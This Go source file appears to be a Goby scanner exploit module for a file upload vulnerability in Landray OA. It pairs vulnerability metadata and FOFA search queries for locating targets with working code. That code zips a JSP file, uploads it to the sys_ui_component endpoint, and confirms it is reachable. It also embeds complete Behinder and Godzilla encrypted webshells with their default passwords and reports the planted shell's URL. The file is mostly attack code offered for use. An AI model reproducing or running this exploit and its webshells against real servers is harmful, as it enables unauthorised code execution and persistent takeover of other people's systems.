package exploits

import (
	"archive/zip"
	"bytes"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Landray OA sys_ui_component file upload vulnerability",
    "Description": "<p>Landray Intelligent OA is developed by Shenzhen Lanling Software Co., Ltd. It is a mobile intelligent office product designed for small and medium-sized enterprises. It combines the digital capabilities of DingTalk and Lanling's years of OA product and service experience, and can comprehensively meet the needs of daily office, enterprise culture, customer management, personnel service, and administrative service for enterprises.</p><p>Attackers can exploit file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to the server being attacked and taken over.</p>",
    "Product": "Landray-OA",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2023-11-12",
    "PostTime": "2023-11-22",
    "Author": "zou",
    "FofaQuery": "body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || title=\"欢迎登录智慧协同平台\" || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "GobyQuery": "body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || title=\"欢迎登录智慧协同平台\" || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "Level": "3",
    "Impact": "<p>Attackers can exploit file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to the server being attacked and taken over.</p>",
    "Recommendation": "<p>1. Please upgrade the system to the latest version and contact the manufacturer to fix the vulnerability: <a href=\"https://www.landray.com.cn/\">https://www.landray.com.cn/</a><a href=\"http://www.entersoft.cn/\"></a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/HsjgUY183BGB5qMnD1ArOw"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "hello12341x.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": " item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "蓝凌 OA sys_ui_component 文件上传漏洞",
            "Product": "Landray-OA系统",
            "Description": "<p>蓝凌智能 OA 是由深圳市蓝凌软件股份有限公司开发，是一款针对中小企业的移动化智能办公产品，融合了钉钉数字化能力与蓝凌多年 OA 产品与服务经验，能全面满足企业日常办公在线、企业文化在线、客户管理在线、人事服务在线、行政务服务在线等需求。</p><p>攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。</p>",
            "Recommendation": "<p>1、请升级系统到最新版本，联系厂商修复漏洞：&nbsp;<a href=\"https://www.landray.com.cn/\">https://www.landray.com.cn/</a><a href=\"http://www.entersoft.cn/\"></a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。<br></p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Landray OA sys_ui_component file upload vulnerability",
            "Product": "Landray-OA",
            "Description": "<p>Landray Intelligent OA is developed by Shenzhen Lanling Software Co., Ltd. It is a mobile intelligent office product designed for small and medium-sized enterprises. It combines the digital capabilities of DingTalk and Lanling's years of OA product and service experience, and can comprehensively meet the needs of daily office, enterprise culture, customer management, personnel service, and administrative service for enterprises.<br></p><p>Attackers can exploit file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to the server being attacked and taken over.</p>",
            "Recommendation": "<p>1. Please upgrade the system to the latest version and contact the manufacturer to fix the vulnerability:&nbsp;<a href=\"https://www.landray.com.cn/\">https://www.landray.com.cn/</a><a href=\"http://www.entersoft.cn/\"></a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can exploit file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to the server being attacked and taken over.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10876"
}`
	creatZipFlag5Tvv97 := func(filename string, content string) string {
		var zipData bytes.Buffer
		zipWriter := zip.NewWriter(&zipData)
		shellBodyBytes := []byte(content)
		webShellWriter, _ := zipWriter.Create(filename + ".jsp")
		io.Copy(webShellWriter, bytes.NewReader(shellBodyBytes))
		configBodyBytes := []byte("id=" + filename)
		configFileWriter, _ := zipWriter.Create("component.ini")
		io.Copy(configFileWriter, bytes.NewReader(configBodyBytes))
		zipWriter.Close()
		zipBytes := zipData.Bytes()
		return string(zipBytes)
	}

	uploadFileFlag5Tvv97 := func(hostInfo *httpclient.FixUrl, filename string, content string) (*httpclient.HttpResponse, error) {
		filename = strings.ReplaceAll(filename, `.jsp`, ``)
		uploadRequestConfig := httpclient.NewPostRequestConfig("/sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo")
		uploadRequestConfig.Header.Store("Accept", " application/json, text/javascript, */*; q=0.01")
		uploadRequestConfig.Header.Store("Accept-Encoding", "gzip, deflate")
		uploadRequestConfig.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
		uploadRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryV2WIcoFIGythzfhN")
		zipFilename := goutils.RandomHexString(16)
		uploadRequestConfig.Data = "------WebKitFormBoundaryV2WIcoFIGythzfhN\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + zipFilename + ".zip" + "\"\r\n" + "Content-Type: application/x-zip-compressed\r\n\r\n" + creatZipFlag5Tvv97(filename, content) + "\r\n------WebKitFormBoundaryV2WIcoFIGythzfhN--\r\n"
		resp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig)
		if err != nil {
			return nil, err
		} else if resp != nil && len(regexp.MustCompile(`"directoryPath":"([^"]+)"`).FindStringSubmatch(resp.Utf8Html)) > 1 {
			checkRequestConfig := httpclient.NewGetRequestConfig(`/resource/ui-component/` + regexp.MustCompile(`"directoryPath":"([^"]+)"`).FindStringSubmatch(resp.Utf8Html)[1] + "/" + filename + ".jsp")
			checkRequestConfig.VerifyTls = false
			checkRequestConfig.VerifyTls = false
			checkRequestConfig.FollowRedirect = false
			return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
		} else {
			return nil, errors.New("漏洞利用失败")
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(5)
			checkStr := goutils.RandomHexString(10)
			resp, _ := uploadFileFlag5Tvv97(hostInfo, filename, "<% out.println(\""+checkStr+"\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>")
			return resp != nil && strings.Contains(resp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			var content string
			filename := goutils.RandomHexString(5)
			if attackType == "behinder" {
				// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
				content = "<%@page import=\"java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*\" %><%! class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64 = Class.forName(\"java.util.Base64\"); Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});} catch (Exception e) {try { base64 = Class.forName(\"sun.misc.BASE64Decoder\");  Object decoder = base64.newInstance();  value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) {}}return value;}%><% if(request.getMethod().equals(\"POST\")){String k = \"e45e329feb5d925b\";session.putValue(\"u\", k);Cipher c = Cipher.getInstance(\"AES\");c.init(2, new SecretKeySpec(k.getBytes(), \"AES\"));StringBuilder sb = new StringBuilder();InputStream inputStream = request.getInputStream();BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));String line;while ((line = reader.readLine()) != null) {sb.append(line);}String data = sb.toString();byte[] bytes = c.doFinal(base64Decode(data));new U(this.getClass().getClassLoader()).g(bytes).newInstance().equals(pageContext);}%>"
			} else if attackType == "godzilla" {
				// 哥斯拉 pass key
				content = "<%! String xc = \"3c6e0b8a9c15224a\";String pass = \"pass\";String md5 = md5(pass + xc);static Class payloadClass;class X extends ClassLoader {public X(ClassLoader z) {super(z);}public Class Q(byte[] cb) {return super.defineClass(cb, 0, cb.length);}}public byte[] x(byte[] s, boolean m) {try {javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));return c.doFinal(s);} catch (Exception e) {return null;}}public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\"MD5\");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret;}public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64 = Class.forName(\"java.util.Base64\");Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);value = (String) Encoder.getClass().getMethod(\"encodeToString\", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});} catch (Exception e) {try {base64 = Class.forName(\"sun.misc.BASE64Encoder\");Object Encoder = base64.newInstance();value = (String) Encoder.getClass().getMethod(\"encode\", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});} catch (Exception e2) {}}return value;}public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64 = Class.forName(\"java.util.Base64\");Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});} catch (Exception e) {try {base64 = Class.forName(\"sun.misc.BASE64Decoder\");Object decoder = base64.newInstance();value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});} catch (Exception e2) {}}return value;}%><%try {byte[] data = base64Decode(request.getParameter(pass));data = x(data, false);if (payloadClass == null) {payloadClass = new X(this.getClass().getClassLoader()).Q(data);} else {java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();Object f = payloadClass.newInstance();f.equals(arrOut);f.equals(pageContext);f.equals(data);response.getWriter().write(md5.substring(0, 16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));}} catch (Exception e) {}%>"
			} else if attackType == "custom" {
				filename = goutils.B2S(stepLogs.Params["filename"])
				content = goutils.B2S(stepLogs.Params["content"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			resp, err := uploadFileFlag5Tvv97(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Output = err.Error()
			} else if resp.StatusCode == 200 || resp.StatusCode == 500 {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				if attackType == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if attackType == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: jsp"
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
